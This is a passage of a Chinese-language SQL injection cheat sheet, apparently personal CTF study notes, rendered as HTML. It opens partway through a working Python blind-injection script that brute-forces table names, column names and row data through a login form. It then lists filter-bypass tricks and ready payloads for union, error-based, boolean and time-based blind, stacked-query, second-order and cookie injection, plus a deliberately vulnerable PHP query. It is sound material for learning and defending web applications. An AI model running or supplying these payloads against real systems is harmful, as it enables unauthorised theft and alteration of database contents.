          head <span class=\"token operator\">=</span> <span class=\"token number\">0</span>  <span class=\"token comment\"># ASCII 起始值</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>            tail <span class=\"token operator\">=</span> <span class=\"token number\">127</span>  <span class=\"token comment\"># ASCII 结束值</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>            <span class=\"token keyword\">while</span> head <span class=\"token operator\">&lt;</span> tail<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>                mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>head <span class=\"token operator\">+</span> tail<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>                <span class=\"token comment\"># 构造注入 payload</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>                payload <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>                    <span class=\"token string\">'username'</span><span class=\"token punctuation\">:</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"' OR IF(ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = '</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>table_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">' LIMIT </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>column_index<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">,1), </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>char_index<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, 1)) > </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>mid<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, 0, 1) -- \"</span></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>                    <span class=\"token string\">'password'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'random_password'</span>  <span class=\"token comment\"># 密码字段可以随便填</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>                r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token string\">\"用户名或密码错误\"</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>                    head <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>                <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>                    tail <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"64\"></td><td><pre>            <span class=\"token keyword\">if</span> head <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 检测到 ASCII 0 时结束当前列名</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>            current_column <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>head<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>            char_index <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> current_column<span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 无更多列时退出循环</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>        result <span class=\"token operator\">+=</span> current_column <span class=\"token operator\">+</span> <span class=\"token string\">\"\\n\"</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>        column_index <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    <span class=\"token keyword\">return</span> result</pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token comment\"># 提取数据</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">extract_data</span><span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">,</span> column_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>    result <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    data_index <span class=\"token operator\">=</span> <span class=\"token number\">0</span>  <span class=\"token comment\"># 数据的索引，从 0 开始</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>        char_index <span class=\"token operator\">=</span> <span class=\"token number\">1</span>  <span class=\"token comment\"># 字符的索引，从 1 开始</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>        current_data <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>            head <span class=\"token operator\">=</span> <span class=\"token number\">0</span>  <span class=\"token comment\"># ASCII 起始值</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>            tail <span class=\"token operator\">=</span> <span class=\"token number\">127</span>  <span class=\"token comment\"># ASCII 结束值</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>            <span class=\"token keyword\">while</span> head <span class=\"token operator\">&lt;</span> tail<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>                mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>head <span class=\"token operator\">+</span> tail<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>                <span class=\"token comment\"># 构造注入 payload</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>                payload <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>                    <span class=\"token string\">'username'</span><span class=\"token punctuation\">:</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"' OR IF(ASCII(SUBSTRING((SELECT </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>column_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> FROM </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>table_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> LIMIT </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>data_index<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">,1), </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>char_index<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, 1)) > </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>mid<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, 0, 1) -- \"</span></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>                    <span class=\"token string\">'password'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'random_password'</span>  <span class=\"token comment\"># 密码字段可以随便填</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>                r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token string\">\"用户名或密码错误\"</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>                    head <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>                <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>                    tail <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"99\"></td><td><pre>            <span class=\"token keyword\">if</span> head <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 检测到 ASCII 0 时结束当前数据</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>            current_data <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>head<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>            char_index <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> current_data<span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 无更多数据时退出循环</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>        result <span class=\"token operator\">+=</span> current_data <span class=\"token operator\">+</span> <span class=\"token string\">\"\\n\"</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>        data_index <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>    <span class=\"token keyword\">return</span> result</pre></td></tr><tr><td data-num=\"110\"></td><td><pre></pre></td></tr><tr><td data-num=\"111\"></td><td><pre><span class=\"token comment\"># 主函数</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>        <span class=\"token comment\"># 提取表名</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"提取表名中...\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>    tables <span class=\"token operator\">=</span> extract_table_name<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"获取到的表名：\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>tables<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>    <span class=\"token comment\"># 提取列名</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>    table_name <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入要提取列名的表名：\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"提取表 </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>table_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> 的列名中...\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>    columns <span class=\"token operator\">=</span> extract_column_name<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"获取到的列名：\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>columns<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>    <span class=\"token comment\"># 提取数据</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>    column_name <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入要提取数据的列名：\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"提取表 </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>table_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> 中列 </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>column_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> 的数据中...\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>    data <span class=\"token operator\">=</span> extract_data<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">,</span> column_name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"获取到的数据：\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"零绕过方式\"><a class=\"anchor\" href=\"#零绕过方式\">#</a> 零。绕过方式</h2>\n<blockquote>\n<blockquote>\n<p><strong>大小写绕过</strong>：比如过滤 select 时，在不区分大小写时候可以 Select 绕过</p>\n</blockquote>\n<blockquote>\n<p><strong>双写绕过</strong>：过滤关键字可以用 selselctect 来绕过</p>\n</blockquote>\n<blockquote>\n<p><strong>空格绕过</strong>：</p>\n<p>○/**/ 可以代替空格当空格被过滤的时候</p>\n<p>例如：select/**/user/**/from/**/users;</p>\n<p>○可以使用 Tab 代替空格</p>\n<p>○可以使用空格 url 编码 %20</p>\n<p>○如果空格被过滤，括号没有被过滤，可以用括号绕过</p>\n<p>例如：select (user) from (users);</p>\n</blockquote>\n<blockquote>\n<p><strong>= 被过滤</strong>：可以用 like 或 rlike，也可以用 regexp（正则来匹配）来绕过</p>\n<p>比如 ='admin' 就可以 like'admin'</p>\n</blockquote>\n<blockquote>\n<p><strong>select 被过滤</strong>：可以使用 desc 倒序查看表内的字段，也可以 showcolumnsfrom 表名。当需要查看具体信息的时候，可以使用预处理语句（堆叠注入查询）</p>\n</blockquote>\n<blockquote>\n<p><strong>编码绕过</strong>：两次 URL 全编码</p>\n</blockquote>\n</blockquote>\n<h2 id=\"一联合注入\"><a class=\"anchor\" href=\"#一联合注入\">#</a> 一。联合注入</h2>\n<h3 id=\"格式\"><a class=\"anchor\" href=\"#格式\">#</a> 格式</h3>\n<pre><code class=\"language-mysql\">' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema = DATABASE() -- \n</code></pre>\n<blockquote>\n<p>union 内部的 select 语句<strong>必须拥有相同数量的列</strong>。列也必须拥有相似的数据类型。</p>\n<p>同时，每条 select 语句中的列的顺序必须是相同的。</p>\n</blockquote>\n<p>有时返回的不是我们想要的数据，请记住返回值（要显示的那个！）在原查询的位置</p>\n<p>在进行联合查询时，同位置的就会覆盖显示过去（尽管可能都不在一个表，不是一个名）</p>\n<h3 id=\"一些小部件\"><a class=\"anchor\" href=\"#一些小部件\">#</a> 一些小部件</h3>\n<h4 id=\"1order-by\"><a class=\"anchor\" href=\"#1order-by\">#</a> 1.order by</h4>\n<p>除了关键字 DESC, 还可以：</p>\n<p><code>order by column_name/数字（对应第几列）</code></p>\n<p><strong>不存在（名字 or 列数）会报错</strong></p>\n<h4 id=\"2concat\"><a class=\"anchor\" href=\"#2concat\">#</a> 2.concat</h4>\n<p>拼接字符串，格式：</p>\n<p><code>concat(str1，str2)</code></p>\n<p>其中一个为 null，就会直接返回 null</p>\n<h4 id=\"3group_concat\"><a class=\"anchor\" href=\"#3group_concat\">#</a> 3.group_concat</h4>\n<p>格式：</p>\n<pre><code class=\"language-mysql\">group_concat([distinct]要连接的字段[order by 排序字段 asc/desc][separator ‘分隔符’])\n</code></pre>\n<p><code>distinct</code> \t去重</p>\n<p>分隔符默认是逗号</p>\n<h4 id=\"4group-by\"><a class=\"anchor\" href=\"#4group-by\">#</a> 4.group by</h4>\n<p>值得注意的是，MySQL 实现这个是通过建立一个临时空表</p>\n<h4 id=\"5substr\"><a class=\"anchor\" href=\"#5substr\">#</a> 5.substr</h4>\n<p>格式：substr (string，start，length)</p>\n<p>0 是第一个位置，负数从结尾指定位置开始</p>\n<p>length 可选，默认是到结束位置</p>\n<h4 id=\"6ascll\"><a class=\"anchor\" href=\"#6ascll\">#</a> 6.ascll</h4>\n<p>格式：ascii (str)</p>\n<p>返回字符串最左边字符的 ascll</p>\n<p><strong>只返回一个</strong></p>\n<h4 id=\"7database\"><a class=\"anchor\" href=\"#7database\">#</a> 7.database()</h4>\n<p>当前使用的数据库，相当于使用该库名</p>\n<h3 id=\"流程\"><a class=\"anchor\" href=\"#流程\">#</a> 流程</h3>\n<p>1. 判断注入点</p>\n<p>用 ' 等尝试破环查询语句，看看回显（整型不用闭合）</p>\n<p>// 整型都不用引号，字符型要注意闭合</p>\n<p>2. 摸个表！</p>\n<p>用上面的 order by 数字，看看到多少会报错（回显异常）</p>\n<p>以及摸一摸回显的在第几个位置（实在不行直接 1，2，3 看回来哪个）</p>\n<p>3. 开查！</p>\n<blockquote>\n<blockquote>\n<pre><code class=\"language-mysql\">&gt;id=1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='数据库名称'\n//查表名\n\n&gt;id=1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='表名称'\n//查字段名（列名）\n\n&gt;id=1 union select 1,2,字段名 from 表名\n//查详细信息\n</code></pre>\n</blockquote>\n</blockquote>\n<h2 id=\"二报错注入\"><a class=\"anchor\" href=\"#二报错注入\">#</a> 二。报错注入</h2>\n<p>前提是会回显错误，可以乱写 SQL 试一试有没有显示报错</p>\n<h3 id=\"1updatexml\"><a class=\"anchor\" href=\"#1updatexml\">#</a> 1.updatexml()</h3>\n<h4 id=\"模板\"><a class=\"anchor\" href=\"#模板\">#</a> 模板</h4>\n<blockquote>\n<p>select * from major where id=1 and updatexml(1,concat(0x26,(select database()),0x26),3)</p>\n</blockquote>\n<h4 id=\"语法\"><a class=\"anchor\" href=\"#语法\">#</a> 语法</h4>\n<p>updatexml（xml_documat，XPath_string，new_value）</p>\n<p><code>xml_documat</code> ：string，为 XML 文档对象的名称，这一项可以输入一个十六进制的字符，比如 0x26（&amp;）。</p>\n<p><code>XPath_string</code> ：XPath（一种字符串格式），报错注入时需要写入错误的格式来显示错误的信息。</p>\n<p>new_value：string，替换查找到符合条件的数据，在注入时可以加入任意字符，比如 0x26（&amp;）</p>\n<h4 id=\"原理\"><a class=\"anchor\" href=\"#原理\">#</a> 原理</h4>\n<p>用 0x26 开头，显然不是 XPath 格式，这是报错。</p>\n<p>XPath 格式出错会返回其内容，因此用 concat 把我们要的东西连在 0x26 后</p>\n<h3 id=\"2extractvalue\"><a class=\"anchor\" href=\"#2extractvalue\">#</a> 2.extractvalue()</h3>\n<h4 id=\"模板-2\"><a class=\"anchor\" href=\"#模板-2\">#</a> 模板</h4>\n<blockquote>\n<p>select * from major where id=1 and extractvalue(1,concat(0x26,(selectdatabase()),0x26)</p>\n</blockquote>\n<h4 id=\"语法-2\"><a class=\"anchor\" href=\"#语法-2\">#</a> 语法</h4>\n<p>extractvalue（xml_documat，XPath_string）</p>\n<p>原理同上</p>\n<h2 id=\"三布尔盲注\"><a class=\"anchor\" href=\"#三布尔盲注\">#</a> 三。布尔盲注</h2>\n<h3 id=\"流程-2\"><a class=\"anchor\" href=\"#流程-2\">#</a> 流程</h3>\n<h4 id=\"1查数据库\"><a class=\"anchor\" href=\"#1查数据库\">#</a> 1. 查数据库</h4>\n<pre><code class=\"language-mysql\">id=1 and (length(database())&gt;3    \n-- 查长度         \n          \nid=1 and (ascii(substr(database(),1,1))&gt;110   \n-- 查具体字符\n</code></pre>\n<h4 id=\"2查表\"><a class=\"anchor\" href=\"#2查表\">#</a> 2. 查表</h4>\n<pre><code class=\"language-mysql\">1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;0  \n-- 查表数，加limit子句分页输出，改变起始位置，长度不变，直到报错（不存在当然无法比较）\n\n1 and ascii(substr((select table_name from information_schema.tables where table_schema=database()limit0,1),1,1))=110\n-- 查表名\n</code></pre>\n<h4 id=\"3查字段\"><a class=\"anchor\" href=\"#3查字段\">#</a> 3. 查字段</h4>\n<p>假设查出的表名是 flag</p>\n<pre><code class=\"language-mysql\">1 and (select count(column_name) from information_schema.columns where table_name=&quot;flag&quot;)=1\n-- 查列数\n\n1 and ascii(substr((select column_name from information_schema.columns where table_name=&quot;flag&quot; [and ordinal_position = 1]),1,1))=102\n-- 查列名，同样通过改start参数来换位置,改ordinal_position来查询其他列\n</code></pre>\n<h4 id=\"4查数据\"><a class=\"anchor\" href=\"#4查数据\">#</a> 4. 查数据</h4>\n<p>假设查出来的列名也是 flag</p>\n<pre><code class=\"language-mysql\">1 and(select count(flag) from flag)=1\n-- 查有多少个字段信息（多少非空行）\n\n1 and ascii(substr((select flag from flag limit 0,1),32,1))\n-- 查字段信息有多长，改substr的start来判断长度，改limit的start来换行\n\n1 and ascii(substr((select flag from flag limit0,1),1,1))=99\n-- 查具体字段信息\n</code></pre>\n<p>很显然，你并不必要查名字或者字段信息的长度，因为不存在也无法比较</p>\n<p>对于字符信息，也可以用 ascii 值为 0 来当作结束条件。</p>\n<h3 id=\"判断\"><a class=\"anchor\" href=\"#判断\">#</a> 判断</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token string\">\"用户名或密码错误\"</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\thead <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    tail <span class=\"token operator\">=</span> mid</pre></td></tr></table></figure><h2 id=\"四时间盲注\"><a class=\"anchor\" href=\"#四时间盲注\">#</a> 四。时间盲注</h2>\n<p>和布尔盲注类似，但是不依赖固定的返回值</p>\n<p>两者只有判断条件的不同</p>\n<pre><code class=\"language-mysql\">IF(ASCII(SUBSTRING((SELECT &#123;column_name&#125; FROM &#123;table_name&#125; LIMIT &#123;data_index&#125;,1), &#123;char_index&#125;, 1)) &gt; &#123;mid&#125;, SLEEP(3), 0)\n#对于布尔盲注，要把sleep(3)改为1，来返回真，此后判断返回值是否含有错误时的内容来判断\n</code></pre>\n<p>时间盲注是：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>start_time <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>end_time <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>elapsed_time <span class=\"token operator\">=</span> end_time <span class=\"token operator\">-</span> start_time</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span> elapsed_time <span class=\"token operator\">>=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\thead <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    tail <span class=\"token operator\">=</span> mid</pre></td></tr></table></figure><h2 id=\"五堆叠查询注入\"><a class=\"anchor\" href=\"#五堆叠查询注入\">#</a> 五。堆叠查询注入</h2>\n<h3 id=\"模板-3\"><a class=\"anchor\" href=\"#模板-3\">#</a> 模板</h3>\n<pre><code class=\"language-mysql\">1';select * from major;#\n</code></pre>\n<h3 id=\"流程select被过滤\"><a class=\"anchor\" href=\"#流程select被过滤\">#</a> 流程（select 被过滤）</h3>\n<p><code>show databases</code></p>\n<p><code>show tables</code></p>\n<p>desc `表名`</p>\n<p>或者</p>\n<p>show columns from `表名`</p>\n<p>sEt @a=concat (&quot;sel&quot;,&quot;ect 列名 from` 表名 `&quot;);PRepare hello from @a;execute hello</p>\n<p>------- 多次堆叠和预处理语句</p>\n<h3 id=\"原理-2\"><a class=\"anchor\" href=\"#原理-2\">#</a> 原理</h3>\n<p>SQL 语句可以堆叠，多语句分号隔开，这也导致你其实可以直接修改数据库......</p>\n<p>加上盲注的几个，就可以窃取 + 修改（可刑可拷）</p>\n<h3 id=\"ex预处理语句\"><a class=\"anchor\" href=\"#ex预处理语句\">#</a> EX. 预处理语句</h3>\n<p>一种特殊的 SQL 处理方式；预处理不会直接执行 SQL 语句，而是先将 SQL 语句编译，生成执行计划，然后通过 Execute 命令携带 SQL 参数来执行 SQL 语句</p>\n<p>模板：</p>\n<pre><code class=\"language-mysql\">@a prepare xxx as select * from user where id=1;  -- 将select查询语句(@a)定义为xxx \n然后就\nexecute xxx -- 执行@a语句，为了避免过滤，上面使用concat来组成select\n可以用set来对@a参数赋值（可见concat的返回值就是结果）\n</code></pre>\n<h2 id=\"六二次注入\"><a class=\"anchor\" href=\"#六二次注入\">#</a> 六。二次注入</h2>\n<p>用于注册加登录加可以改密的页面，所以叫二次</p>\n<p>注册时加点特殊字符</p>\n<p>比如用户名 &amp; 密码设为：</p>\n<p>'admin123&quot;\\</p>\n<p>如果登录后改密会<strong>报错</strong>，说明可以二次注入</p>\n<p>然后：</p>\n<p>只要在用户名处用报错注入</p>\n<p>修改密码的时候就会触发（密码都是随便填，但要记住，登录要用）</p>\n<h2 id=\"七cookie注入\"><a class=\"anchor\" href=\"#七cookie注入\">#</a> 七.cookie 注入</h2>\n<p><strong>本质上只是注入点不同</strong></p>\n<p>一种变体，只有参数用 cookie 传递的时候才能用</p>\n<p>比如:</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$user_id</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT * FROM users WHERE user_id = '<span class=\"token interpolation\"><span class=\"token variable\">$user_id</span></span>'\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>然后就抓包，直接去 cookie 里找 